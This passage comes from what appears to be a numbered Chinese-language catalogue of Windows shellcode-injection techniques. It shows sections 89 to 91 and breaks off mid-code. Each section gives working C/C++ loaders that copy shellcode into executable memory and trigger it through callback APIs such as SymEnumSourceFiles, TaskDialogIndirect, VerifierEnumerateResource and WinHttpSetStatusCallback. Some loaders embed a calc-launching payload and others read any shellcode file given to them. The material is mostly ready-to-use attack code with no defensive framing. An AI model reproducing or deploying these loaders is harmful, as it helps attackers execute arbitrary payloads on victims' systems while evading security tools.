class="hljs-string">"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"</span><br><span class="linenum hljs-number">16</span><span class="hljs-string">"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"</span><br><span class="linenum hljs-number">17</span><span class="hljs-string">"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"</span><br><span class="linenum hljs-number">18</span><span class="hljs-string">"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"</span><br><span class="linenum hljs-number">19</span><span class="hljs-string">"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"</span><br><span class="linenum hljs-number">20</span><span class="hljs-string">"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"</span><br><span class="linenum hljs-number">21</span><span class="hljs-string">"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"</span><br><span class="linenum hljs-number">22</span><span class="hljs-string">"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"</span><br><span class="linenum hljs-number">23</span><span class="hljs-string">"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"</span><br><span class="linenum hljs-number">24</span><span class="hljs-string">"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"</span><br><span class="linenum hljs-number">25</span><span class="hljs-string">"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"</span><br><span class="linenum hljs-number">26</span><span class="hljs-string">"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"</span><br><span class="linenum hljs-number">27</span><span class="hljs-string">"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"</span><br><span class="linenum hljs-number">28</span><span class="hljs-string">"\x63\x2e\x65\x78\x65\x00"</span>;<br><span class="linenum hljs-number">29</span><br><span class="linenum hljs-number">30</span><span class="hljs-function"><span class="hljs-keyword">int</span>&nbsp;<span class="hljs-title">main</span><span class="hljs-params">()</span>&nbsp;</span>{<br><span class="linenum hljs-number">31</span><br><span class="linenum hljs-number">32</span><br><span class="linenum hljs-number">33</span>&nbsp;&nbsp;&nbsp;&nbsp;LPVOID&nbsp;address&nbsp;=&nbsp;::VirtualAlloc(<span class="hljs-literal">NULL</span>,&nbsp;<span class="hljs-keyword">sizeof</span>(op),&nbsp;MEM_RESERVE&nbsp;|&nbsp;MEM_COMMIT,&nbsp;PAGE_EXECUTE_READWRITE);<br><span class="linenum hljs-number">34</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">memcpy</span>(address,&nbsp;&amp;op[<span class="hljs-number">0</span>],&nbsp;<span class="hljs-keyword">sizeof</span>(op));<br><span class="linenum hljs-number">35</span><br><span class="linenum hljs-number">36</span>&nbsp;&nbsp;&nbsp;&nbsp;::SymInitialize(::GetCurrentProcess(),&nbsp;<span class="hljs-literal">NULL</span>,&nbsp;TRUE);<br><span class="linenum hljs-number">37</span><br><span class="linenum hljs-number">38</span>&nbsp;&nbsp;&nbsp;&nbsp;::SymEnumSourceFiles(::GetCurrentProcess(),&nbsp;<span class="hljs-literal">NULL</span>,&nbsp;<span class="hljs-literal">NULL</span>,&nbsp;(PSYM_ENUMSOURCEFILES_CALLBACK)address,&nbsp;<span class="hljs-literal">NULL</span>);<br><span class="linenum hljs-number">39</span><br><span class="linenum hljs-number">40</span><br><span class="linenum hljs-number">41</span>}<br></code></pre>
<h1 id="h89taskdialogindirect"><span>89.回调函数注入 通过 TaskDialogIndirect</span></h1>
<pre><code class="hljs cpp"><span class="linenum hljs-number"> 1</span><span class="hljs-comment">//&nbsp;Wra7h/FlavorTown</span><br><span class="linenum hljs-number"> 2</span><span class="hljs-comment">//&nbsp;Written/Compiled:&nbsp;Visual&nbsp;Studio&nbsp;2022</span><br><span class="linenum hljs-number"> 3</span><span class="hljs-comment">//&nbsp;Usage:&nbsp;this.exe&nbsp;&lt;shellcode&nbsp;file&gt;</span><br><span class="linenum hljs-number"> 4</span><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span>&nbsp;comment(lib,&nbsp;<span class="hljs-meta-string">"Comctl32.lib"</span>)</span><br><span class="linenum hljs-number"> 5</span><br><span class="linenum hljs-number"> 6</span><span class="hljs-comment">//https://stackoverflow.com/questions/37016803/calling-taskdialogindirect-loader-says-ordinal-345-not-found</span><br><span class="linenum hljs-number"> 7</span><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span>&nbsp;defined&nbsp;_M_IX86</span><br><span class="linenum hljs-number"> 8</span><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span>&nbsp;comment(linker,&nbsp;<span class="hljs-meta-string">"/manifestdependency:\"type='win32'&nbsp;name='Microsoft.Windows.Common-Controls'&nbsp;version='6.0.0.0'&nbsp;processorArchitecture='x86'&nbsp;publicKeyToken='6595b64144ccf1df'&nbsp;language='*'\""</span>)</span><br><span class="linenum hljs-number"> 9</span><span class="hljs-meta">#<span class="hljs-meta-keyword">elif</span>&nbsp;defined&nbsp;_M_IA64</span><br><span class="linenum hljs-number">10</span><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span>&nbsp;comment(linker,&nbsp;<span class="hljs-meta-string">"/manifestdependency:\"type='win32'&nbsp;name='Microsoft.Windows.Common-Controls'&nbsp;version='6.0.0.0'&nbsp;processorArchitecture='ia64'&nbsp;publicKeyToken='6595b64144ccf1df'&nbsp;language='*'\""</span>)</span><br><span class="linenum hljs-number">11</span><span class="hljs-meta">#<span class="hljs-meta-keyword">elif</span>&nbsp;defined&nbsp;_M_X64</span><br><span class="linenum hljs-number">12</span><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span>&nbsp;comment(linker,&nbsp;<span class="hljs-meta-string">"/manifestdependency:\"type='win32'&nbsp;name='Microsoft.Windows.Common-Controls'&nbsp;version='6.0.0.0'&nbsp;processorArchitecture='amd64'&nbsp;publicKeyToken='6595b64144ccf1df'&nbsp;language='*'\""</span>)</span><br><span class="linenum hljs-number">13</span><span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span><br><span class="linenum hljs-number">14</span><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span>&nbsp;comment(linker,&nbsp;<span class="hljs-meta-string">"/manifestdependency:\"type='win32'&nbsp;name='Microsoft.Windows.Common-Controls'&nbsp;version='6.0.0.0'&nbsp;processorArchitecture='*'&nbsp;publicKeyToken='6595b64144ccf1df'&nbsp;language='*'\""</span>)</span><br><span class="linenum hljs-number">15</span><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><span class="linenum hljs-number">16</span><br><span class="linenum hljs-number">17</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="linenum hljs-number">18</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="linenum hljs-number">19</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;Commctrl.h&gt;&nbsp;</span></span><br><span class="linenum hljs-number">20</span><br><span class="linenum hljs-number">21</span><span class="hljs-function">BOOL&nbsp;<span class="hljs-title">ReadContents</span><span class="hljs-params">(PWSTR&nbsp;Filepath,&nbsp;PCHAR*&nbsp;Buffer,&nbsp;PDWORD&nbsp;BufferSize)</span></span>;<br><span class="linenum hljs-number">22</span><br><span class="linenum hljs-number">23</span><span class="hljs-function">INT&nbsp;<span class="hljs-title">wmain</span><span class="hljs-params">(INT&nbsp;argc,&nbsp;WCHAR*&nbsp;argv[])</span><br><span class="linenum hljs-number">24</span></span>{<br><span class="linenum hljs-number">25</span>&nbsp;&nbsp;&nbsp;&nbsp;BOOL&nbsp;Ret&nbsp;=&nbsp;FALSE;<br><span class="linenum hljs-number">26</span>&nbsp;&nbsp;&nbsp;&nbsp;DWORD&nbsp;SCLen&nbsp;=&nbsp;<span class="hljs-number">0</span>;<br><span class="linenum hljs-number">27</span>&nbsp;&nbsp;&nbsp;&nbsp;PCHAR&nbsp;Shellcode&nbsp;=&nbsp;<span class="hljs-literal">NULL</span>;<br><span class="linenum hljs-number">28</span><br><span class="linenum hljs-number">29</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(argc&nbsp;!=&nbsp;<span class="hljs-number">2</span>)<br><span class="linenum hljs-number">30</span>&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number">31</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Usage:&nbsp;TaskDialogIndirect.exe&nbsp;C:\\Path\\To\\Shellcode.bin"</span>);<br><span class="linenum hljs-number">32</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">goto</span>&nbsp;CLEANUP;<br><span class="linenum hljs-number">33</span>&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">34</span><br><span class="linenum hljs-number">35</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-comment">//Read&nbsp;shellcode&nbsp;and&nbsp;setup</span><br><span class="linenum hljs-number">36</span>&nbsp;&nbsp;&nbsp;&nbsp;Ret&nbsp;=&nbsp;ReadContents(argv[<span class="hljs-number">1</span>],&nbsp;&amp;Shellcode,&nbsp;&amp;SCLen);<br><span class="linenum hljs-number">37</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(!Ret)<br><span class="linenum hljs-number">38</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">goto</span>&nbsp;CLEANUP;<br><span class="linenum hljs-number">39</span><br><span class="linenum hljs-number">40</span>&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;hAlloc&nbsp;=&nbsp;VirtualAlloc(<span class="hljs-literal">NULL</span>,&nbsp;SCLen,<br><span class="linenum hljs-number">41</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MEM_COMMIT&nbsp;|&nbsp;MEM_RESERVE,&nbsp;PAGE_EXECUTE_READWRITE);<br><span class="linenum hljs-number">42</span><br><span class="linenum hljs-number">43</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">memcpy</span>(hAlloc,&nbsp;Shellcode,&nbsp;SCLen);<br><span class="linenum hljs-number">44</span><br><span class="linenum hljs-number">45</span>&nbsp;&nbsp;&nbsp;&nbsp;TASKDIALOGCONFIG&nbsp;sTDC&nbsp;=&nbsp;{&nbsp;<span class="hljs-number">0</span>&nbsp;};<br><span class="linenum hljs-number">46</span>&nbsp;&nbsp;&nbsp;&nbsp;sTDC.pfCallback&nbsp;=&nbsp;(PFTASKDIALOGCALLBACK)hAlloc;<br><span class="linenum hljs-number">47</span>&nbsp;&nbsp;&nbsp;&nbsp;sTDC.cbSize&nbsp;=&nbsp;<span class="hljs-keyword">sizeof</span>(TASKDIALOGCONFIG);<br><span class="linenum hljs-number">48</span>&nbsp;&nbsp;&nbsp;&nbsp;TaskDialogIndirect(&amp;sTDC,&nbsp;<span class="hljs-literal">NULL</span>,&nbsp;<span class="hljs-literal">NULL</span>,&nbsp;<span class="hljs-literal">NULL</span>);<br><span class="linenum hljs-number">49</span><br><span class="linenum hljs-number">50</span>CLEANUP:<br><span class="linenum hljs-number">51</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(Shellcode)<br><span class="linenum hljs-number">52</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">free</span>(Shellcode);<br><span class="linenum hljs-number">53</span><br><span class="linenum hljs-number">54</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">return</span>&nbsp;<span class="hljs-number">0</span>;<br><span class="linenum hljs-number">55</span>}<br><span class="linenum hljs-number">56</span><br><span class="linenum hljs-number">57</span><span class="hljs-function">BOOL&nbsp;<span class="hljs-title">ReadContents</span><span class="hljs-params">(PWSTR&nbsp;Filepath,&nbsp;PCHAR*&nbsp;Buffer,&nbsp;PDWORD&nbsp;BufferSize)</span><br><span class="linenum hljs-number">58</span></span>{<br><span class="linenum hljs-number">59</span>&nbsp;&nbsp;&nbsp;&nbsp;FILE*&nbsp;f&nbsp;=&nbsp;<span class="hljs-literal">NULL</span>;<br><span class="linenum hljs-number">60</span>&nbsp;&nbsp;&nbsp;&nbsp;_wfopen_s(&amp;f,&nbsp;Filepath,&nbsp;<span class="hljs-string">L"rb"</span>);<br><span class="linenum hljs-number">61</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(f)<br><span class="linenum hljs-number">62</span>&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number">63</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fseek(f,&nbsp;<span class="hljs-number">0</span>,&nbsp;SEEK_END);<br><span class="linenum hljs-number">64</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*BufferSize&nbsp;=&nbsp;ftell(f);<br><span class="linenum hljs-number">65</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fseek(f,&nbsp;<span class="hljs-number">0</span>,&nbsp;SEEK_SET);<br><span class="linenum hljs-number">66</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*Buffer&nbsp;=&nbsp;<span class="hljs-built_in">malloc</span>(*BufferSize);<br><span class="linenum hljs-number">67</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fread(*Buffer,&nbsp;*BufferSize,&nbsp;<span class="hljs-number">1</span>,&nbsp;f);<br><span class="linenum hljs-number">68</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fclose(f);<br><span class="linenum hljs-number">69</span>&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">70</span><br><span class="linenum hljs-number">71</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">return</span>&nbsp;(*BufferSize&nbsp;!=&nbsp;<span class="hljs-number">0</span>)&nbsp;?&nbsp;TRUE&nbsp;:&nbsp;FALSE;<br><span class="linenum hljs-number">72</span>}<br></code></pre>
<h1 id="h90verifierenumerateresource"><span>90.回调函数注入 通过 VerifierEnumerateResource</span></h1>
<pre><code class="hljs cpp"><span class="linenum hljs-number"> 1</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="linenum hljs-number"> 2</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;avrfsdk.h&gt;</span></span><br><span class="linenum hljs-number"> 3</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="linenum hljs-number"> 4</span><br><span class="linenum hljs-number"> 5</span><span class="hljs-function"><span class="hljs-keyword">typedef</span>&nbsp;<span class="hljs-title">ULONG</span><span class="hljs-params">(WINAPI*&nbsp;VerifierEnumResourceFn)</span><span class="hljs-params">(<br><span class="linenum hljs-number"> 6</span>&nbsp;&nbsp;&nbsp;&nbsp;HANDLE&nbsp;Process,<br><span class="linenum hljs-number"> 7</span>&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;&nbsp;Flags,<br><span class="linenum hljs-number"> 8</span>&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;&nbsp;ResourceType,<br><span class="linenum hljs-number"> 9</span>&nbsp;&nbsp;&nbsp;&nbsp;AVRF_RESOURCE_ENUMERATE_CALLBACK&nbsp;ResourceCallback,<br><span class="linenum hljs-number">10</span>&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;&nbsp;EnumerationContext<br><span class="linenum hljs-number">11</span>&nbsp;&nbsp;&nbsp;&nbsp;)</span></span>;<br><span class="linenum hljs-number">12</span><br><span class="linenum hljs-number">13</span><span class="hljs-comment">//&nbsp;alfarom256&nbsp;calc&nbsp;shellcode</span><br><span class="linenum hljs-number">14</span><span class="hljs-keyword">unsigned</span>&nbsp;<span class="hljs-keyword">char</span>&nbsp;op[]&nbsp;=<br><span class="linenum hljs-number">15</span><span class="hljs-string">"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"</span><br><span class="linenum hljs-number">16</span><span class="hljs-string">"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"</span><br><span class="linenum hljs-number">17</span><span class="hljs-string">"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"</span><br><span class="linenum hljs-number">18</span><span class="hljs-string">"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"</span><br><span class="linenum hljs-number">19</span><span class="hljs-string">"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"</span><br><span class="linenum hljs-number">20</span><span class="hljs-string">"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"</span><br><span class="linenum hljs-number">21</span><span class="hljs-string">"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"</span><br><span class="linenum hljs-number">22</span><span class="hljs-string">"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"</span><br><span class="linenum hljs-number">23</span><span class="hljs-string">"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"</span><br><span class="linenum hljs-number">24</span><span class="hljs-string">"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"</span><br><span class="linenum hljs-number">25</span><span class="hljs-string">"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"</span><br><span class="linenum hljs-number">26</span><span class="hljs-string">"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"</span><br><span class="linenum hljs-number">27</span><span class="hljs-string">"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"</span><br><span class="linenum hljs-number">28</span><span class="hljs-string">"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"</span><br><span class="linenum hljs-number">29</span><span class="hljs-string">"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"</span><br><span class="linenum hljs-number">30</span><span class="hljs-string">"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"</span><br><span class="linenum hljs-number">31</span><span class="hljs-string">"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"</span><br><span class="linenum hljs-number">32</span><span class="hljs-string">"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"</span><br><span class="linenum hljs-number">33</span><span class="hljs-string">"\x63\x2e\x65\x78\x65\x00"</span>;<br><span class="linenum hljs-number">34</span><br><span class="linenum hljs-number">35</span><br><span class="linenum hljs-number">36</span><br><span class="linenum hljs-number">37</span><span class="hljs-function"><span class="hljs-keyword">int</span>&nbsp;<span class="hljs-title">main</span><span class="hljs-params">()</span>&nbsp;</span>{<br><span class="linenum hljs-number">38</span><br><span class="linenum hljs-number">39</span><br><span class="linenum hljs-number">40</span>&nbsp;&nbsp;&nbsp;&nbsp;LPVOID&nbsp;addr&nbsp;=&nbsp;::VirtualAlloc(<span class="hljs-literal">NULL</span>,&nbsp;<span class="hljs-keyword">sizeof</span>(op),&nbsp;MEM_COMMIT,&nbsp;PAGE_EXECUTE_READWRITE);<br><span class="linenum hljs-number">41</span>&nbsp;&nbsp;&nbsp;&nbsp;::RtlMoveMemory(addr,&nbsp;op,&nbsp;<span class="hljs-keyword">sizeof</span>(op));<br><span class="linenum hljs-number">42</span><br><span class="linenum hljs-number">43</span>&nbsp;&nbsp;&nbsp;&nbsp;HMODULE&nbsp;lib&nbsp;=&nbsp;LoadLibraryW(<span class="hljs-string">L"verifier.dll"</span>);<br><span class="linenum hljs-number">44</span><br><span class="linenum hljs-number">45</span>&nbsp;&nbsp;&nbsp;&nbsp;VerifierEnumResourceFn&nbsp;VerifierEnumResource;<br><span class="linenum hljs-number">46</span><br><span class="linenum hljs-number">47</span>&nbsp;&nbsp;&nbsp;&nbsp;*(FARPROC*)&amp;VerifierEnumResource&nbsp;=&nbsp;GetProcAddress(lib,<span class="hljs-string">"VerifierEnumerateResource"</span>);<br><span class="linenum hljs-number">48</span><br><span class="linenum hljs-number">49</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(<span class="hljs-literal">NULL</span>&nbsp;==&nbsp;VerifierEnumResource)<br><span class="linenum hljs-number">50</span>&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number">51</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">printf</span>(<span class="hljs-string">"could&nbsp;not&nbsp;find&nbsp;entry&nbsp;point&nbsp;%s&nbsp;in&nbsp;verifier.dll\n"</span>,<br><span class="linenum hljs-number">52</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"VerifierEnumerateResource"</span>);<br><span class="linenum hljs-number">53</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">return</span>&nbsp;GetLastError();<br><span class="linenum hljs-number">54</span>&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">55</span><br><span class="linenum hljs-number">56</span>&nbsp;&nbsp;&nbsp;&nbsp;VerifierEnumResource(::GetCurrentProcess(),&nbsp;<span class="hljs-literal">NULL</span>,&nbsp;AvrfResourceHeapAllocation,&nbsp;(AVRF_RESOURCE_ENUMERATE_CALLBACK)addr,&nbsp;<span class="hljs-literal">NULL</span>);<br><span class="linenum hljs-number">57</span><br><span class="linenum hljs-number">58</span>}<br></code></pre>
<h1 id="h91winhttpsetstatus"><span>91.回调函数注入 通过 WinHttpSetStatus</span></h1>
<pre><code class="hljs cpp"><span class="linenum hljs-number"> 1</span><span class="hljs-comment">//&nbsp;Wra7h/FlavorTown</span><br><span class="linenum hljs-number"> 2</span><span class="hljs-comment">//&nbsp;Written/Compiled:&nbsp;Visual&nbsp;Studio&nbsp;2022</span><br><span class="linenum hljs-number"> 3</span><span class="hljs-comment">//&nbsp;Usage:&nbsp;this.exe&nbsp;&lt;shellcode&nbsp;file&gt;</span><br><span class="linenum hljs-number"> 4</span><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span>&nbsp;comment(lib,&nbsp;<span class="hljs-meta-string">"winhttp.lib"</span>)</span><br><span class="linenum hljs-number"> 5</span><br><span class="linenum hljs-number"> 6</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="linenum hljs-number"> 7</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="linenum hljs-number"> 8</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;winhttp.h&gt;</span></span><br><span class="linenum hljs-number"> 9</span><br><span class="linenum hljs-number">10</span><span class="hljs-function">BOOL&nbsp;<span class="hljs-title">ReadContents</span><span class="hljs-params">(PWSTR&nbsp;Filepath,&nbsp;PCHAR*&nbsp;Buffer,&nbsp;PDWORD&nbsp;BufferSize)</span></span>;<br><span class="linenum hljs-number">11</span><br><span class="linenum hljs-number">12</span><span class="hljs-function">INT&nbsp;<span class="hljs-title">wmain</span><span class="hljs-params">(INT&nbsp;argc,&nbsp;WCHAR*&nbsp;argv[])</span><br><span class="linenum hljs-number">13</span></span>{<br><span class="linenum hljs-number">14</span>&nbsp;&nbsp;&nbsp;&nbsp;BOOL&nbsp;Ret&nbsp;=&nbsp;FALSE;<br><span class="linenum hljs-number">15</span>&nbsp;&nbsp;&nbsp;&nbsp;DWORD&nbsp;SCLen&nbsp;=&nbsp;<span class="hljs-number">0</span>;<br><span class="linenum hljs-number">16</span>&nbsp;&nbsp;&nbsp;&nbsp;PCHAR&nbsp;Shellcode&nbsp;=&nbsp;<span class="hljs-literal">NULL</span>;<br><span class="linenum hljs-number">17</span><br><span class="linenum hljs-number">18</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(argc&nbsp;!=&nbsp;<span class="hljs-number">2</span>)<br><span class="linenum hljs-number">19</span>&nbsp;&nbsp;&nbsp;&nbsp;{<br><span class="linenum hljs-number">20</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Usage:&nbsp;WinHttpSetStatus.exe&nbsp;C:\\Path\\To\\Shellcode.bin"</span>);<br><span class="linenum hljs-number">21</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">goto</span>&nbsp;CLEANUP;<br><span class="linenum hljs-number">22</span>&nbsp;&nbsp;&nbsp;&nbsp;}<br><span class="linenum hljs-number">23</span><br><span class="linenum hljs-number">24</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-comment">//Read&nbsp;shellcode&nbsp;and&nbsp;setup</span><br><span class="linenum hljs-number">25</span>&nbsp;&nbsp;&nbsp;&nbsp;Ret&nbsp;=&nbsp;ReadContents(argv[<span class="hljs-number">1</span>],&nbsp;&amp;Shellcode,&nbsp;&amp;SCLen);<br><span class="linenum hljs-number">26</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>&nbsp;(!Ret)<br><span class="linenum hljs-number">27</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">goto</span>&nbsp;CLEANUP;<br><span class="linenum hljs-number">28</span><br><span class="linenum hljs-number">29</span>&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;hAlloc&nbsp;=&nbsp;VirtualAlloc(<span class="hljs-literal">NULL</span>,&nbsp;SCLen,<br><span class="linenum hljs-number">30</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MEM_COMMIT&nbsp;|&nbsp;MEM_RESERVE,&nbsp;PAGE_EXECUTE_READWRITE);<br><span class="linenum hljs-number">31</span><br><span class="linenum hljs-number">32</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">memcpy</span>(hAlloc,&nbsp;Shellcode,&nbsp;SCLen);<br><span class="linenum hljs-number">33</span><br><span class="linenum hljs-number">34</span>&nbsp;&nbsp;&nbsp;&nbsp;HINTERNET&nbsp;hSession&nbsp;=&nbsp;WinHttpOpen(<span class="hljs-literal">NULL</span>,<br><span class="linenum hljs-number">35</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,<br><span class="linenum hljs-number">36</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WINHTTP_NO_PROXY_NAME,<br><span class="linenum hljs-number">37</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WINHTTP_NO_PROXY_BYPASS,&nbsp;<span class="hljs-number">0</span>);<br><span class="linenum hljs-number">38</span><br><span class="linenum hljs-number">39</span>&nbsp;&nbsp;&nbsp;&nbsp;WinHttpSetStatusCallback(hSession,<br><span class="linenum hljs-number">40</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(WINHTTP_STATUS_CALLBACK)hAlloc,<br><span class="linenum hljs-number">41</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WINHTTP_CALLBACK_FLAG_ALL_NOTIFICATIONS,<br><span class="linenum hljs-number">42</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-literal">NULL</span>);<br><span class="linenum hljs-number">43</span><br><span class="linenum hljs-number">44</span>&nbsp;&nbsp;&nbsp;&nbsp;WinHttpConnect(hSession,<br><span class="linenum 